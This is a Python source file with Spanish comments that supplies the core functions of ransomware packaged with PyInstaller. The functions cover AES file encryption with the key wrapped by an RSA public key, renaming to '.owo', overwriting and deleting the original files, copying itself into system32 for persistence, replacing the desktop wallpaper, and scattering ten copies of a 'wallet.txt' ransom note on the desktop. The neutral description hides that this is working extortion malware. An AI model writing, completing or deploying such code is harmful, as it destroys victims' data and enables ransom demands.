"""
Este programa realiza múltiples acciones, incluyendo cifrado de archivos con AES y RSA, manipulación de archivos, 
y modificaciones del sistema en Windows. Está diseñado para ser empaquetado con PyInstaller.

Funciones incluidas:
- Generación y cifrado de claves AES
- Cifrado de archivos con AES
- Manipulación del sistema (copiado a system32, cambio de fondo de escritorio)
- Copiado de archivos wallet al escritorio
"""

import os
import base64
import shutil
import ctypes
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives import serialization, hashes
import sys

def generar_clave_aes():
    """
    Genera una clave AES de 256 bits (32 bytes) aleatoria.
    
    Retorna:
        bytes: Clave AES de 256 bits.
    
    Lógica:
    Se utiliza la función get_random_bytes para generar una cadena de bytes aleatoria de longitud fija, que 
    corresponde a una clave de cifrado de 256 bits.
    """
    return get_random_bytes(32)

def cifrar_clave_aes_rsa(clave_aes, public_key_pem):
    """
    Cifra la clave AES utilizando un cifrado RSA con la llave pública proporcionada.
    
    Args:
        clave_aes (bytes): Clave AES que se desea cifrar.
        public_key_pem (str): Clave pública RSA en formato PEM.
    
    Retorna:
        str: Clave AES cifrada y codificada en base64.
    
    Lógica:
    La clave AES es cifrada usando el esquema RSA con OAEP, que es un esquema de cifrado basado en clave pública
    y utiliza el algoritmo SHA-256 tanto en la función MGF1 como en el algoritmo principal.
    El resultado se codifica en base64 para su fácil almacenamiento y transmisión.
    """
    public_key = serialization.load_pem_public_key(public_key_pem.encode(), backend=default_backend())
    clave_cifrada = public_key.encrypt(
        clave_aes,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return base64.b64encode(clave_cifrada).decode()

def leer_clave_publica():
    """
    Lee la clave pública desde el archivo 'public_key.pem'.

    Retorna:
        str: Contenido del archivo PEM de la clave pública.
    
    Lógica:
    Dependiendo de si el programa está empaquetado con PyInstaller o no, se accede al archivo 'public_key.pem' en 
    la ubicación correcta. El archivo es leído y su contenido se retorna como una cadena de texto.
    """
    if getattr(sys, 'frozen', False):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(os.path.abspath(__file__))

    ruta_clave_publica = os.path.join(base_path, 'public_key.pem')

    with open(ruta_clave_publica, 'r') as f:
        public_key_pem = f.read()

    return public_key_pem

def cifrar_archivo_aes(archivo, clave_aes):
    """
    Cifra un archivo utilizando el cifrado AES en modo CBC.

    Args:
        archivo (str): Ruta al archivo que se desea cifrar.
        clave_aes (bytes): Clave AES utilizada para el cifrado.
    
    Lógica:
    Se utiliza el modo de cifrado CBC con un vector de inicialización (IV) generado automáticamente. 
    El archivo es leído en su totalidad y los datos son cifrados con AES, luego se guarda el archivo cifrado 
    en una nueva ruta con la extensión '.owo'.
    """
    cipher = AES.new(clave_aes, AES.MODE_CBC)
    iv = cipher.iv
    with open(archivo, 'rb') as f:
        datos = f.read()

    datos_cifrados = cipher.encrypt(pad(datos, AES.block_size))
    with open(archivo + '.owo', 'wb') as f:
        f.write(iv + datos_cifrados)

def borrar_archivo_seguro(archivo):
    """
    Borra un archivo de forma segura sobrescribiéndolo con datos aleatorios antes de eliminarlo.

    Args:
        archivo (str): Ruta al archivo que se desea borrar.
    
    Lógica:
    El archivo es sobrescrito con datos aleatorios de la misma longitud antes de ser eliminado, lo que dificulta su 
    recuperación mediante técnicas de recuperación de datos.
    """
    with open(archivo, 'ba+', buffering=0) as f:
        length = f.tell()
        f.seek(0)
        f.write(os.urandom(length))

    os.remove(archivo)

def copiar_ejecutable_a_system32():
    """
    Copia el ejecutable actual del programa a la carpeta 'system32' de Windows.

    Lógica:
    El programa identifica si está empaquetado como un ejecutable usando PyInstaller. Si es así, copia el ejecutable
    en ejecución a la carpeta 'system32' para garantizar que el programa tenga presencia en un directorio del sistema.
    """
    windir = os.environ['WINDIR']
    system32_path = os.path.join(windir, 'system32')
    
    if getattr(sys, 'frozen', False):
        current_executable = sys.executable
    else:
        current_executable = os.path.abspath(__file__)
    
    shutil.copy(current_executable, system32_path)

def cambiar_fondo_escritorio(ruta_imagen):
    """
    Cambia el fondo de escritorio de Windows usando la imagen proporcionada.

    Args:
        ruta_imagen (str): Ruta a la imagen que se usará como fondo de pantalla.
    
    Lógica:
    Utiliza la función `SystemParametersInfoW` de la biblioteca ctypes para modificar el fondo de escritorio del 
    usuario con la imagen proporcionada.
    """
    image_path = os.path.abspath(ruta_imagen)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)

def obtener_ruta_imagen_empaquetada():
    """
    Obtiene la ruta de la imagen empaquetada con PyInstaller, si aplica.

    Retorna:
        str: Ruta a la imagen 'fondo.png'.
    
    Lógica:
    Si el programa está empaquetado, se obtiene la ruta de la imagen desde la carpeta interna de PyInstaller. Si no, 
    se devuelve una ruta relativa predeterminada.
    """
    if getattr(sys, '_MEIPASS', False):
        return os.path.join(sys._MEIPASS, 'fondo.png')
    else:
        return 'fondo.png'

def copiar_wallet_al_escritorio():
    """
    Copia el archivo 'wallet.txt' al escritorio del usuario, creando 10 copias con nombres incrementales.

    Lógica:
    El archivo 'wallet.txt' es copiado al escritorio con nombres que varían en el número de 't's al final del nombre.
    Este proceso se repite 10 veces para generar múltiples copias del archivo.
    """
    user_profile = os.environ['USERPROFILE']
    desktop_dir = os.path.join(user_profile, 'Desktop')

    if getattr(sys, 'frozen', False):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(os.path.abspath(__file__))

    wallet_path = os.path.join(base_path, 'wallet.txt')

    for i in range(10):
        nombre_archivo = f"wallett{'t' * i}.txt"
        ruta_destino = os.path.join(desktop_dir, nombre_archivo)
        shutil.copy(wallet_path, ruta_destino)
